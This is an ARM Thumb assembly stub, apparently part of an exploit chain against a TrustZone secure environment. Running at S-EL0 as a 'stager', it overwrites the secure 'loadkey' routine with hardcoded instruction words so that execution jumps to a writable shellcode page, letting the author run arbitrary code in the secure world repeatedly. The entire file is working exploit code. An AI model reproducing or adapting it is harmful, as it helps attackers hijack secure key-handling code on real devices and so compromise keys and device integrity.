.section .text
.syntax unified
.global _start

.thumb
_start:

    # NOTE: we're running as S-EL0 as a stager
    # This stub is responsible for patching the secure loadkey to execute
    # off a shellcode page which we can directly read and write
    # This way, we can easy run shellcode multiple times
    nop
    nop


    # hook loadkey with the following stub
    # ldr.w r0, =0x237d201
    # bx r0

    ldr r0, =0x104e
    ldr r1, =0x0006f8df
    str r1, [r0]
    ldr r1, =0xbf004700
    str r1, [r0, #4]
    ldr r1, =0x0237d301
    str r1, [r0, #8]

    # return to where we would have been in S-EL0
    ldr r0, =0x116F
    bx r0
     
    nop

    .word 0xAAAA
